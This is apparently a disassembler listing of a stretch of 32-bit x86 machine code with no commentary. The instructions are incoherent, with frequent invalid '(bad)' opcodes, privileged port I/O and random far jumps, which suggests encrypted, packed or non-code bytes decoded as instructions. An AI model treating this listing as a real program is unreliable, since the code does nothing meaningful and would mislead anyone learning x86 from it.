  402abc:	fdivr  DWORD PTR [edx]
  402abe:	frstor [esi-0x1cb0b588]
  402ac4:	fsubr  DWORD PTR [edx+0x73]
  402ac7:	jecxz  0x402ab2
  402ac9:	mov    ebx,0xd09f7593
  402ace:	jo     0x402b33
  402ad0:	cmc    
  402ad1:	std    
  402ad2:	fs jle 0x402a70
  402ad5:	xlat   BYTE PTR ds:[ebx]
  402ad6:	dec    ecx
  402ad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ad8:	push   esi
  402ad9:	sar    DWORD PTR [ecx],cl
  402adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402adc:	adc    al,0xfc
  402ade:	xchg   edi,eax
  402adf:	sbb    bl,bl
  402ae1:	mov    ds:0x84af3d2a,al
  402ae6:	mov    al,ds:0x5c255500
  402aeb:	push   edx
  402aec:	cmc    
  402aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402aee:	cmp    ebx,DWORD PTR [edx+0x4205948]
  402af4:	mov    eax,ds:0xc7d69534
  402af9:	sub    BYTE PTR [edx+0x1546f6d1],ah
  402aff:	mov    ah,0x4c
  402b01:	jns    0x402ab4
  402b03:	inc    edi
  402b04:	and    DWORD PTR [eax+0x7f],edi
  402b07:	jmp    0xa330:0x83b67d1a
  402b0e:	mov    bl,0xaf
  402b10:	js     0x402b2a
  402b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b13:	cmp    eax,0x40b3f689
  402b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b19:	push   cs
  402b1a:	stos   DWORD PTR es:[edi],eax
  402b1b:	pop    edi
  402b1c:	push   ds
  402b1d:	jle    0x402ad6
  402b1f:	out    dx,al
  402b20:	ret    0x2746
  402b23:	mov    esi,0x797974e2
  402b28:	data16 jge 0x402b9f
  402b2b:	push   eax
  402b2c:	xchg   edi,eax
  402b2d:	pop    es
  402b2e:	jnp    0x402b17
  402b30:	cmc    
  402b31:	adc    eax,DWORD PTR [ecx+0x31c67a42]
  402b37:	adc    DWORD PTR [ecx+0x3a1c3b61],0xffffffb0
  402b3e:	je     0x402b6f
  402b40:	adc    ecx,DWORD PTR [eax-0x4fecb35c]
  402b46:	adc    cl,ah
  402b48:	push   ebx
  402b49:	shl    BYTE PTR [edi+0x26],0xa6
  402b4d:	int3   
  402b4e:	jg     0x402b72
  402b50:	sub    cl,BYTE PTR [ebx+0x1ec06d27]
  402b56:	cmp    eax,0xcfedf535
  402b5b:	(bad)  
  402b5c:	in     eax,dx
  402b5d:	nop
  402b5e:	sub    dh,BYTE PTR [esi]
  402b60:	sbb    dl,BYTE PTR [ecx]
  402b62:	call   0xaaed6a9e
  402b67:	(bad)  
  402b68:	clc    
  402b69:	addr16 mov al,0xa9
  402b6c:	add    esp,0x72
  402b6f:	sbb    al,0x91
  402b71:	fs pop ecx
  402b73:	stc    
  402b74:	pop    eax
  402b75:	mov    al,0xca
  402b77:	xor    eax,0x9eb6afeb
  402b7c:	push   esi
  402b7d:	sbb    cl,cl
  402b7f:	test   eax,edi
  402b81:	push   ebp
  402b82:	jecxz  0x402bc2
  402b84:	addr16 hlt 
  402b86:	pop    edx
  402b87:	and    esi,eax
  402b89:	aam    0x3
  402b8b:	xchg   DWORD PTR [ebp-0x48],ebx
  402b8e:	cmp    BYTE PTR [esi],dl
  402b90:	fwait
  402b91:	xchg   esi,eax
  402b92:	fsubr  DWORD PTR [edx+0x6c]
  402b95:	popa   
  402b96:	mov    ch,0xb6
  402b98:	cmc    
  402b99:	push   ecx
  402b9a:	mov    DWORD PTR [esi+eax*1+0x30],edi
  402b9e:	(bad)  
  402b9f:	aam    0xdc
  402ba1:	cs pop edi
  402ba3:	pop    ebp
  402ba4:	sbb    esp,esi
  402ba6:	fld    QWORD PTR [edx-0x79]
  402ba9:	fldcw  WORD PTR [ebx+esi*2]
  402bac:	rol    BYTE PTR [esi+0xd950513],1
  402bb2:	jl     0x402bfb
  402bb4:	pusha  
  402bb5:	je     0x402bfd
  402bb7:	outs   dx,DWORD PTR ds:[esi]
  402bb8:	lds    esi,FWORD PTR [ebx-0x51cf6089]
  402bbe:	aaa    
  402bbf:	pusha  
  402bc0:	cwde   
  402bc1:	jno    0x402bd7
  402bc3:	mov    ebp,0x2cdb2fe7
  402bc8:	call   0x6773:0x2a4d1ad
  402bcf:	sbb    edi,DWORD PTR [eax-0x64]
  402bd2:	cld    
  402bd3:	int    0x40
  402bd5:	pop    ebx
  402bd6:	dec    ebx
  402bd7:	xor    eax,0x674b62ca
  402bdc:	xchg   esi,eax
  402bdd:	hlt    
  402bde:	and    ebx,DWORD PTR [ecx+edi*8+0x6a]
  402be2:	push   ds
  402be3:	mov    ds:0xb5901336,al
  402be8:	int    0xc
  402bea:	push   edi
  402beb:	fld    QWORD PTR [ebp-0x47b36a3b]
  402bf1:	cmp    al,0x5b
  402bf3:	or     DWORD PTR [ebx-0x6e],ecx
  402bf6:	fsubr  DWORD PTR [edx+0x4e]
  402bf9:	push   edi
  402bfa:	out    0xe0,al
  402bfc:	addr16 aas 
  402bfe:	xchg   ch,al
  402c00:	ret    0xc317
  402c03:	push   ecx
  402c04:	int    0x25
  402c06:	pop    esi
  402c07:	mov    es,esi
  402c09:	test   DWORD PTR [ebp+0x14f2f22e],esp
  402c0f:	sahf   
  402c10:	mov    al,0xc3
  402c12:	sar    BYTE PTR [ebx-0x442d8330],0x92
  402c19:	das    
  402c1a:	mov    edx,0x4f7caf62
  402c1f:	stos   DWORD PTR es:[edi],eax
  402c20:	mov    ch,0xa5
  402c22:	xchg   esi,eax
  402c23:	sub    BYTE PTR [ebx],bl
  402c25:	not    DWORD PTR [esi]
  402c27:	in     al,dx
  402c28:	(bad)  [eax]
  402c2a:	ja     0x402c76
  402c2c:	ja     0x402c0d
  402c2e:	fstp   DWORD PTR [esi+0x1d]
  402c31:	ins    BYTE PTR es:[edi],dx
  402c32:	into   
  402c33:	jnp    0x402c23
  402c35:	or     al,0x3a
  402c37:	sbb    eax,0x4224cb88
  402c3c:	out    dx,al
  402c3d:	stos   BYTE PTR es:[edi],al
  402c3e:	je     0x402be6
  402c40:	popf   
  402c41:	(bad)  
  402c42:	dec    ebp
  402c43:	jp     0x402c7d
  402c45:	addr16 adc al,0x88
  402c48:	dec    edx
  402c49:	data16 clc 
  402c4b:	jg     0x402bd5
  402c4d:	xchg   esp,eax
  402c4e:	fistp  DWORD PTR [edi+0x71edc182]
  402c54:	jle    0x402be2
  402c56:	and    BYTE PTR [ebx],0x98
  402c59:	dec    ebx
  402c5a:	loop   0x402c2b
  402c5c:	adc    ah,BYTE PTR [ebx+0x52]
  402c5f:	xchg   esp,ebp
  402c61:	cmp    al,0xe
  402c63:	jb     0x402c89
  402c65:	push   DWORD PTR [ecx]
  402c67:	push   edi
  402c68:	push   0xffffff84
  402c6a:	push   es
  402c6b:	imul   ebx,DWORD PTR [ebx-0x1da0dfda],0x37
  402c72:	and    eax,0x81971c1c
  402c77:	or     eax,0xf510e377
  402c7c:	mov    edi,0xa4e93060
  402c81:	push   ds
  402c82:	pop    es
  402c83:	xchg   BYTE PTR ds:0x9f0974e0,dl
  402c89:	fcom   QWORD PTR [ecx]
  402c8b:	mov    edi,DWORD PTR [eax+0x46]
  402c8e:	and    dl,BYTE PTR [edx]
  402c90:	dec    esi
  402c91:	sti    
  402c92:	ds cli 
  402c94:	(bad)  
  402c95:	imul   ebp,ebp,0xa2a44ab1
  402c9b:	retf   
  402c9c:	stos   BYTE PTR es:[edi],al
  402c9d:	(bad)  
  402c9e:	mov    ?,ecx
  402ca0:	sti    
  402ca1:	adc    ah,BYTE PTR [edx+0x4611fc86]
  402ca7:	stos   BYTE PTR es:[edi],al
  402ca8:	dec    eax
  402ca9:	sbb    ch,bl
  402cab:	and    bl,BYTE PTR [ebx]
  402cad:	add    al,0xc3
  402caf:	push   ebx
  402cb0:	(bad)  
  402cb1:	arpl   WORD PTR [edx],di
  402cb3:	mov    ds:0xe717ca,eax
  402cb8:	pop    ss
  402cb9:	xor    eax,0x9b2bc54a
  402cbe:	xor    edi,esp
  402cc0:	js     0x402d3c
  402cc2:	inc    ebp
  402cc3:	inc    edx
  402cc4:	dec    eax
  402cc5:	pop    ds
  402cc6:	scas   eax,DWORD PTR es:[edi]
  402cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cc8:	outs   dx,BYTE PTR ds:[esi]
  402cc9:	mov    esi,0xd7b6e642
  402cce:	inc    esi
  402ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cd0:	fnsave [edx-0x455ab170]
  402cd6:	mov    edx,0x56e2db60
  402cdb:	xor    DWORD PTR [ecx+esi*8+0x1b],0xf631f12e
  402ce3:	nop
  402ce4:	sbb    DWORD PTR [eax],ebp
  402ce6:	xchg   edi,eax
  402ce7:	loopne 0x402cfe
  402ce9:	clc    
  402cea:	stos   BYTE PTR es:[edi],al
  402ceb:	fsub   QWORD PTR [edi]
  402ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cee:	test   edi,0x93d29cb1
  402cf4:	pop    ebp
  402cf5:	cmp    ch,BYTE PTR [ebp-0x28]
  402cf8:	loope  0x402d63
  402cfa:	cmc    
  402cfb:	mov    cl,0x42
  402cfd:	add    al,0x69
  402cff:	retf   0x2d53
  402d02:	rcr    DWORD PTR [edi],cl
  402d04:	into   
  402d05:	push   ebx
  402d06:	stos   BYTE PTR es:[edi],al
  402d07:	adc    dl,al
  402d09:	aam    0xdd
  402d0b:	sub    BYTE PTR [esi],0xc2
  402d0e:	add    al,0xbd
  402d10:	cld    
  402d11:	push   0xffffff9b
  402d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d14:	sub    ebx,DWORD PTR [esi-0x21]
  402d17:	xor    ch,BYTE PTR [eax+0x7a]
  402d1a:	dec    ebp
  402d1b:	icebp  
  402d1c:	xchg   BYTE PTR [edx+0x5e],dl
  402d1f:	(bad)  
  402d20:	out    dx,al
  402d21:	mov    ecx,0xa4a1d85c
  402d26:	add    al,0xc6
  402d28:	xor    al,0x21
  402d2a:	dec    edx
  402d2b:	pop    ebp
  402d2c:	jo     0x402cb9
  402d2e:	sbb    ecx,edx
  402d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d31:	mov    dh,al
  402d33:	adc    bh,BYTE PTR [edx]
  402d35:	add    esi,DWORD PTR [eax+0x62]
  402d38:	popa   
  402d39:	sub    BYTE PTR [edx+0x57ee1492],dl
  402d3f:	mov    ds:0x9162e446,al
  402d44:	or     edi,DWORD PTR ds:0xdde0506d
  402d4a:	in     eax,dx
  402d4b:	jno    0x402d4a
  402d4d:	scas   al,BYTE PTR es:[edi]
  402d4e:	bound  ecx,QWORD PTR [edi-0x2cde212f]
  402d54:	outs   dx,DWORD PTR ds:[esi]
  402d55:	fimul  WORD PTR [ebp+0x4c8de7d5]
  402d5b:	mov    ds:0x7aa23776,eax
  402d60:	dec    eax
  402d61:	push   ss
  402d62:	lea    edx,[edi*2-0xde1469e]
  402d69:	jno    0x402d54
  402d6b:	outs   dx,BYTE PTR ds:[esi]
  402d6c:	or     bh,BYTE PTR ds:0x11561672
  402d72:	xchg   BYTE PTR [esp+edx*1],ch
  402d75:	pop    ds
  402d76:	(bad)  
  402d77:	out    0x10,al
  402d79:	or     eax,DWORD PTR fs:[esp+ecx*4+0x58]
  402d7e:	int3   
  402d7f:	inc    esp
  402d80:	repnz lods eax,DWORD PTR ds:[esi]
  402d82:	or     eax,0x90788a9e
  402d87:	mov    ebx,0xef0c2bff
  402d8c:	pop    ecx
  402d8d:	sahf   
  402d8e:	or     eax,0x49a37631
  402d93:	push   0xfe77b995
  402d98:	xor    al,0x99
  402d9a:	cdq    
  402d9b:	jno    0x402e06
  402d9d:	loopne 0x402e07
  402d9f:	mov    eax,0xc0a4ddd9
  402da4:	cs cli 
  402da6:	cmp    BYTE PTR ds:0x12a648f,dl
  402dac:	div    DWORD PTR ds:0x4e798343
  402db2:	xlat   BYTE PTR ds:[ebx]
  402db3:	sub    eax,0xf04ff40e
  402db8:	pop    eax
  402db9:	lods   al,BYTE PTR ds:[esi]
  402dba:	push   eax
  402dbb:	ffreep st(2)
  402dbd:	ins    BYTE PTR es:[edi],dx
  402dbe:	push   edx
  402dbf:	aam    0x8f
  402dc1:	pop    eax
  402dc2:	bound  edx,QWORD PTR [ebp-0x62]
  402dc5:	dec    DWORD PTR [esi+0x2c]
  402dc8:	loop   0x402e26
  402dca:	das    
  402dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dcc:	cmp    BYTE PTR [esi+0x6d],bh
  402dcf:	jns    0x402daf
  402dd1:	mov    WORD PTR [ecx-0x7f8c68ea],fs
  402dd7:	inc    ecx
  402dd8:	in     al,0xcb
  402dda:	aas    
  402ddb:	fs mov dl,ah
  402dde:	xor    DWORD PTR [ecx-0x897840],ecx
  402de4:	stc    
  402de5:	pop    ebx
  402de6:	inc    esp
  402de7:	loop   0x402e5e
  402de9:	inc    ebp
  402dea:	pop    ebp
  402deb:	push   0x38
  402ded:	jae    0x402e2c
  402def:	in     eax,0x6a
  402df1:	sar    ah,1
  402df3:	imul   esi,DWORD PTR [edi-0x6a7effbe],0x36
  402dfa:	xchg   edi,eax
  402dfb:	pminub mm0,QWORD PTR [edi+0x1c]
  402dff:	cwde   
  402e00:	add    al,BYTE PTR [esi+ebx*8+0x618f943d]
  402e07:	pop    es
  402e08:	inc    edx
  402e09:	cmp    eax,0x5ea643a3
  402e0e:	jmp    0x402e3c
  402e10:	push   esp
  402e11:	pop    es
  402e12:	xor    BYTE PTR [ecx-0x70ef8605],bh
  402e18:	sbb    bl,BYTE PTR [edi+0xde8e572]
  402e1e:	add    BYTE PTR [eax+edi*8],bl
  402e21:	sub    al,0x86
  402e23:	jne    0x402e39
  402e25:	loop   0x402e0b
  402e27:	hlt    
  402e28:	mov    dl,0xa0
  402e2a:	retf   0x34c4
  402e2d:	push   cs
  402e2e:	xor    ebp,DWORD PTR [eax+0x4]
  402e31:	stc    
  402e32:	(bad)  
  402e33:	cs sbb al,0x4b
  402e36:	cmp    cl,BYTE PTR [edi+edx*4]
  402e39:	xchg   ebp,eax
  402e3a:	xchg   edi,eax
  402e3b:	dec    ebp
  402e3c:	mov    esi,ebp
  402e3e:	inc    esp
  402e3f:	jl     0x402ea9
  402e41:	cmp    eax,0xc7fcde22
  402e46:	das    
  402e47:	pop    ebx
  402e48:	(bad)  
  402e49:	das    
  402e4a:	pop    esi
  402e4b:	test   eax,0xec80d006
  402e50:	push   ds
  402e51:	cmp    BYTE PTR [eax-0x5],dh
  402e54:	in     al,0x24
  402e56:	sub    edx,edi
  402e58:	push   ss
  402e59:	mov    ebp,0xe9952b35
  402e5e:	jns    0x402e59
  402e60:	xor    cl,bl
  402e62:	mov    bl,BYTE PTR [eax+edx*8+0xeefd9c8]
  402e69:	outs   dx,BYTE PTR gs:[esi]
  402e6b:	out    dx,eax
  402e6c:	pushf  
  402e6d:	xchg   BYTE PTR [edx+ebp*4-0x46f40bdf],dh
  402e74:	div    BYTE PTR [ecx+0x40ff1215]
  402e7a:	pop    ecx
  402e7b:	ffree  st(3)
  402e7d:	daa    
  402e7e:	pop    ss
  402e7f:	jae    0x402e92
  402e81:	(bad)  
  402e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e83:	mov    dh,0xe0
  402e85:	js     0x402e96
  402e87:	jl     0x402e65
  402e89:	mov    al,0x19
  402e8b:	and    al,0xfc
  402e8d:	push   esp
  402e8e:	cmp    BYTE PTR [eax],dl
  402e90:	hlt    
  402e91:	inc    esp
  402e92:	adc    eax,0x9c634e71
  402e97:	aaa    
  402e98:	sub    BYTE PTR ds:0xf19ec0a1,al
  402e9e:	jno    0x402ee5
  402ea0:	dec    ecx
  402ea1:	or     edx,DWORD PTR [ebx]
  402ea3:	pop    esp
  402ea4:	xor    DWORD PTR [eax],ebx
  402ea6:	sbb    dh,BYTE PTR [eax+0x5f9ac4f5]
  402eac:	ror    DWORD PTR [edx-0x19ccf784],1
  402eb2:	cdq    
  402eb3:	push   ds
  402eb4:	rcr    DWORD PTR [edi+0x4cadf567],1
  402eba:	lahf   
  402ebb:	ret    
  402ebc:	into   
  402ebd:	jmp    0x6faeea57
  402ec2:	xor    esp,ecx
  402ec4:	dec    eax
  402ec5:	clc    
  402ec6:	mov    edx,ebx
  402ec8:	push   es
  402ec9:	lods   al,BYTE PTR ds:[esi]
  402eca:	dec    ebx
  402ecb:	push   edi
  402ecc:	jl     0x402efe
  402ece:	fldcw  WORD PTR ds:0xf115db58
  402ed4:	out    dx,al
  402ed5:	xlat   BYTE PTR ds:[ebx]
  402ed6:	test   BYTE PTR [ecx-0x7e95da31],dl
  402edc:	out    0x96,al
  402ede:	jb     0x402f38
  402ee0:	(bad)  
  402ee1:	cli    
  402ee2:	lahf   
  402ee3:	and    edx,ebx
  402ee5:	adc    DWORD PTR [ecx+0x6444a62d],ebp
  402eeb:	fwait
  402eec:	dec    eax
  402eed:	xor    ebx,DWORD PTR [edx+0x7c]
  402ef0:	jmp    0x2d5d0cb1
  402ef5:	leave  
  402ef6:	dec    esp
  402ef7:	jg     0x402f05
  402ef9:	pop    ebx
  402efa:	imul   ecx,DWORD PTR [ecx+ecx*1-0x55],0x32451683
  402f02:	imul   DWORD PTR [eax+0x2a]
  402f05:	mov    eax,0x492612f
  402f0a:	pop    esi
  402f0b:	rcl    BYTE PTR [esi-0x63414856],1
  402f11:	aas    
  402f12:	dec    esi
  402f13:	xor    eax,0x57758d4f
  402f18:	js     0x402f44
  402f1a:	nop
  402f1b:	lock push ebp
  402f1d:	sar    bh,cl
  402f1f:	addr16 xchg edi,eax
  402f21:	int    0x50
  402f23:	jge    0x402ee2
  402f25:	add    eax,0x869bbbdc
  402f2a:	add    eax,0x60b6fea4
  402f2f:	sub    ecx,esp
  402f31:	ins    DWORD PTR es:[edi],dx
  402f32:	rol    eax,cl
  402f34:	shl    dh,1
  402f36:	nop
  402f37:	fcom   QWORD PTR [eax+0x662c915]
  402f3d:	xor    DWORD PTR [ecx+ecx*8],ebp
  402f40:	(bad)  
  402f41:	push   esi
  402f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f43:	xor    edi,0x79
  402f46:	cmc    
  402f47:	rcl    bh,cl
  402f49:	adc    DWORD PTR [ebp+0x21],eax
  402f4c:	sub    cl,BYTE PTR [edx]
  402f4e:	sbb    bh,0x4
  402f51:	rcr    DWORD PTR [ebx-0x7dce2b86],0x1e
  402f58:	not    BYTE PTR [ebp+ebp*2-0x706227c8]
  402f5f:	aad    0x54
  402f61:	int3   
  402f62:	mov    ah,0x30
  402f64:	sbb    al,0xe5
  402f66:	mov    WORD PTR [eax+0xc727d9a],?
  402f6c:	(bad)  
  402f6d:	out    0xcc,al
  402f6f:	js     0x402efb
  402f71:	or     bl,BYTE PTR [ebp+0x55686cdd]
  402f77:	xlat   BYTE PTR ds:[ebx]
  402f78:	or     al,0xab
  402f7a:	(bad)  
  402f7b:	jmp    0x278b:0xfe30444e
  402f82:	sbb    eax,0xf6543e22
  402f87:	inc    ebp
  402f88:	test   DWORD PTR [ecx],esi
  402f8a:	loope  0x402f78
  402f8c:	enter  0xd826,0xb9
  402f90:	push   eax
  402f91:	dec    ebp
  402f92:	cwde   
  402f93:	loope  0x402fa1
  402f95:	fst    DWORD PTR [ebx+0x36715112]
  402f9b:	or     DWORD PTR [ebx-0x3b683927],0xffffff9d
  402fa2:	(bad)  
  402fa3:	sub    al,0x8c
  402fa5:	push   ss
  402fa6:	leave  
  402fa7:	mov    ch,0x22
  402fa9:	dec    esi
  402faa:	dec    ebx
  402fab:	iret   
  402fac:	sub    dh,dl
  402fae:	cmp    cl,dl
  402fb0:	push   edi
  402fb1:	cmp    DWORD PTR [ebx+0x1da626f3],ebx
  402fb7:	loop   0x402fb8
  402fb9:	and    eax,edi
  402fbb:	cld    
  402fbc:	call   0x458d:0x638c8fdd
  402fc3:	xor    DWORD PTR [ecx+0x436e4281],eax
  402fc9:	inc    ebp
  402fca:	cmc    
  402fcb:	pop    es
  402fcc:	gs mov ebx,0x15aeb04f
  402fd2:	inc    ebp
  402fd3:	mov    ds:0xfaf3207,al
  402fd8:	jle    0x403046
  402fda:	cwde   
  402fdb:	jns    0x402fba
  402fdd:	rcl    BYTE PTR ds:[edx-0x69b41391],1
  402fe4:	pop    ebx
  402fe5:	aad    0x8f
  402fe7:	push   ebp
  402fe8:	fistp  QWORD PTR gs:[eax+0x36325380]
  402fef:	popa   
  402ff0:	mov    ecx,0x8a5c096d
  402ff5:	outs   dx,BYTE PTR ds:[esi]
  402ff6:	mov    ds:0x6b92f250,al
  402ffb:	cdq    
  402ffc:	mov    BYTE PTR [eax+0x5b9af35f],bh
  403002:	push   es
  403003:	lods   al,BYTE PTR ds:[si]
  403005:	mov    ch,0x56
  403007:	push   es
  403008:	das    
  403009:	jl     0x402fc1
  40300b:	push   ebp
  40300c:	nop
  40300d:	push   esi
  40300e:	stos   DWORD PTR es:[edi],eax
  40300f:	push   0xb43588bb
  403014:	aam    0x1e
  403016:	lods   eax,DWORD PTR ds:[esi]
  403017:	inc    esp
  403018:	repz mov edx,ecx
  40301b:	sub    al,0x9a
  40301d:	mov    bh,0x85
  40301f:	jl     0x402fb9
  403021:	daa    
  403022:	(bad)  
  403024:	out    dx,al
  403025:	pop    ss
  403026:	xchg   BYTE PTR [eax],ch
  403028:	fs inc ebx
  40302a:	cmc    
  40302b:	int    0x96
  40302d:	mov    eax,ds:0xe41926cb
  403032:	bound  ecx,QWORD PTR [edx+0x3e]
  403035:	mov    al,ds:0x150c1671
  40303a:	out    dx,eax
  40303b:	les    eax,FWORD PTR [ebp+0x740fc7b2]
  403041:	cmc    
  403042:	and    dl,BYTE PTR [edi+ebp*2+0x10]
  403046:	into   
  403047:	mov    ebx,0x1312df41
  40304c:	test   eax,0x5337c76e
  403051:	fidiv  WORD PTR [esi-0x16]
  403054:	in     al,dx
  403055:	pop    ebp
  403056:	sub    eax,DWORD PTR [edi+0x60]
  403059:	mov    ds,WORD PTR [edx+ebx*8+0x71]
  40305d:	xchg   DWORD PTR [ecx+0x7ea88224],esi
  403063:	or     al,0xbb
  403065:	cmp    eax,0x11a64f1b
  40306a:	jne    0x403075
  40306c:	push   cs
  40306d:	xchg   edx,eax
  40306e:	ins    BYTE PTR es:[edi],dx
  40306f:	mov    ch,0xc5
  403071:	mov    esp,0x5b2e1f66
  403076:	and    BYTE PTR [edi-0x5fc19cf3],0x63
  40307d:	sub    BYTE PTR [edx+0x43be6963],al
  403083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403084:	mov    bh,0x9c
  403086:	add    BYTE PTR [edi+0x5],dh
  403089:	test   BYTE PTR [ecx-0x22],0xc
  40308d:	mov    ebx,DWORD PTR [edi+0x45]
  403090:	mov    ecx,0x407c934
  403095:	out    dx,al
  403096:	hlt    
  403097:	xor    eax,0xa3fc0890
  40309c:	mov    bl,BYTE PTR [esi-0x3242a18e]
  4030a2:	arpl   WORD PTR [esp+ebx*4-0x33],bx
  4030a6:	sub    BYTE PTR [eax],al
  4030a8:	fwait
  4030a9:	sbb    bh,BYTE PTR [eax+eiz*4+0x47795644]
  4030b0:	jae    0x4030cf
  4030b2:	xchg   esp,eax
  4030b3:	jmp    0xa451a8cc
  4030b8:	mov    bh,0x36
  4030ba:	in     al,dx
  4030bb:	(bad)  
  4030bc:	rep outs dx,BYTE PTR ds:[esi]
  4030be:	cmp    eax,0xc807dfe5
  4030c3:	mov    eax,ds:0x533d04e2
  4030c8:	aad    0x28
  4030ca:	mov    esi,DWORD PTR [ecx]
  4030cc:	mov    eax,ecx
  4030ce:	pop    es
  4030cf:	leave  
  4030d0:	fimul  DWORD PTR [edx+0x79c76f7]
  4030d6:	in     al,0x63
  4030d8:	jb     0x40310a
  4030da:	xchg   esp,eax
  4030db:	retf   0xb7e
  4030de:	jge    0x403132
  4030e0:	in     eax,0xd3
  4030e2:	add    al,0xdd
  4030e4:	cli    
  4030e5:	push   edx
  4030e6:	fild   QWORD PTR [ebx+0x3d]
  4030e9:	push   0xaceca01a
  4030ee:	adc    al,0x7e
  4030f0:	xlat   BYTE PTR ds:[ebx]
  4030f1:	call   0x31cc:0xa4d8b745
  4030f8:	lds    edi,FWORD PTR [ecx+0x66]
  4030fb:	and    eax,0x454a9609
  403100:	fwait
  403101:	or     ebx,ecx
  403103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403104:	fisub  WORD PTR [eax]
  403106:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403107:	retf   0xf52
  40310a:	(bad)  
  40310b:	xor    ah,BYTE PTR [edx-0x40a0736d]
  403111:	iret   
  403112:	cs mov bl,0xb1
  403115:	imul   edx,ebp,0x46
  403118:	imul   esi,esi,0xffffffcf
  40311b:	xor    ebx,ecx
  40311d:	or     dh,BYTE PTR [ecx+ebx*1+0x4024f3d8]
  403124:	iret   
  403125:	ins    DWORD PTR es:[edi],dx
  403126:	add    BYTE PTR [edx+0x5d76ec10],dh
  40312c:	ss cmp al,0xf0
  40312f:	js     0x403169
  403131:	inc    eax
  403132:	push   ebp
  403133:	mov    ebp,0xc49cfa1a
  403138:	push   esp
  403139:	mov    al,ds:0x746cd0c1
  40313e:	call   0xdb33:0x50cb55dc
  403145:	(bad)  
  403147:	sar    dh,1
  403149:	sbb    BYTE PTR [esi+0x54d54191],bl
  40314f:	mov    BYTE PTR [ecx],dl
  403151:	adc    eax,0xd1af03ac
  403156:	sbb    BYTE PTR [edi-0x5a72a56e],cl
  40315c:	mov    bl,0xa
  40315e:	add    dl,BYTE PTR [ecx+0x16451ae0]
  403164:	ins    BYTE PTR es:[edi],dx
  403165:	outs   dx,DWORD PTR ds:[esi]
  403166:	or     ch,BYTE PTR [ecx]
  403168:	ss dec ebp
  40316a:	rol    DWORD PTR [edx],1
  40316c:	jbe    0x40311c
  40316e:	sub    eax,DWORD PTR [eax+0x5f]
  403171:	sbb    BYTE PTR [esi],dh
  403173:	and    eax,0x16d02de1
  403178:	rol    eax,0xf4
  40317b:	lahf   
  40317c:	fsub   DWORD PTR [esi-0x36d742ae]
  403182:	mov    ch,0xe6
  403184:	ins    BYTE PTR es:[edi],dx
  403185:	dec    esp
  403186:	dec    edi
  403187:	leave  
  403188:	jo     0x4031a8
  40318a:	test   eax,0xc175888
  40318f:	int3   
  403190:	sub    BYTE PTR [ebp+0x3c],0x32
  403194:	das    
  403195:	int    0x8a
  403197:	xchg   ebx,eax
  403198:	pop    ebp
  403199:	popa   
  40319a:	dec    ecx
  40319b:	bound  esi,QWORD PTR [eax-0x11]
  40319e:	push   eax
  40319f:	inc    edi
  4031a0:	in     eax,dx
  4031a1:	jmp    0xc3e6a6f8
  4031a6:	jo     0x40315f
  4031a8:	sbb    eax,0x48b29352
  4031ad:	lods   eax,DWORD PTR ds:[esi]
  4031ae:	mov    eax,ds:0x99253c09
  4031b3:	and    eax,0x8dbe9967
  4031b8:	daa    
  4031b9:	call   0x2905:0xd775531a
  4031c0:	fidivr DWORD PTR [esi+ebp*4+0x1e]
  4031c4:	sbb    eax,0x17d91900
  4031c9:	or     ecx,DWORD PTR [edi-0x2e]
  4031cc:	aam    0xb5
  4031ce:	pop    es
  4031cf:	dec    esp
  4031d0:	test   DWORD PTR [edi+0x262b4a09],ecx
  4031d6:	popf   
  4031d7:	pop    esi
  4031d8:	mov    cl,0xdd
  4031da:	scas   eax,DWORD PTR es:[edi]
  4031db:	add    DWORD PTR [edi],0xf
  4031de:	fwait
  4031df:	scas   eax,DWORD PTR es:[edi]
  4031e0:	mov    ebp,0x7b1f53ff
  4031e5:	(bad)  
  4031e6:	(bad)  
  4031e7:	std    
  4031e8:	outs   dx,BYTE PTR ds:[esi]
  4031e9:	mov    ch,0x6c
  4031eb:	and    BYTE PTR [ecx+eiz*1-0x48],ah
  4031ef:	stos   DWORD PTR es:[edi],eax
  4031f0:	jne    0x403179
  4031f2:	loope  0x403179
  4031f4:	and    ecx,DWORD PTR [ebx-0x1a531362]
  4031fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031fb:	ret    0x338d
  4031fe:	mov    eax,ds:0x1b9a647b
  403203:	sti    
  403204:	push   edi
  403205:	sub    al,0x43
  403207:	and    al,0xa1
  403209:	clc    
  40320a:	push   edi
  40320b:	stos   DWORD PTR es:[edi],eax
  40320c:	push   0xffffff8b
  40320e:	lahf   
  40320f:	les    ebp,FWORD PTR [esi+0x79]
  403212:	mov    bl,0x2c
  403214:	lock jle 0x403259
  403217:	je     0x40321d
  403219:	call   0x3e8f460a
  40321e:	pop    esi
  40321f:	data16 mov bh,0x3f
  403222:	jnp    0x40321f
  403224:	xchg   DWORD PTR [ebp-0x66],edi
  403227:	out    dx,eax
  403228:	add    ecx,esi
  40322a:	icebp  
  40322b:	std    
  40322c:	inc    eax
  40322d:	test   DWORD PTR ds:0xc8cacfb8,0xf85c403a
  403237:	sbb    edi,ebp
  403239:	jp     0x40324b
  40323b:	push   ss
  40323c:	loop   0x403257
  40323e:	test   eax,0xc1cc466b
  403243:	gs sahf 
  403245:	ja     0x4032b9
  403247:	jae    0x4032a7
  403249:	pop    es
  40324a:	mov    bl,0xca
  40324c:	ret    0xf58a
  40324f:	adc    dl,BYTE PTR [edx+0x920c3f7]
  403255:	mov    cl,0xc1
  403257:	outs   dx,BYTE PTR ds:[esi]
  403258:	adc    DWORD PTR [ebx+0x51],0x6e
  40325c:	dec    esp
  40325d:	pop    esp
  40325e:	std    
